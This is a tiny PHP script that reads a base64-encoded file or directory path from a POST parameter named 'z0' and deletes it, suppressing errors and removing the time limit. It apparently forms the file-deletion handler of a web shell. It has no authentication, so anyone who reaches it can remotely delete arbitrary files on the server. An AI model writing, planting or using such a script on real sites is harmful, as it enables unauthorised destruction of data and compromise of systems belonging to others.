<?php
@ini_set('display_error', '0');
@set_time_limit(0);
$szEntry = base64_decode($_POST['z0']);
if (is_dir($szEntry)) {
    if (rmdir($szEntry)) {
        echo "1";
    } else {
        echo "0";
    }
} else {
    if (unlink($szEntry)) {
        echo "1";
    } else {
        echo "0";
    }
}

?>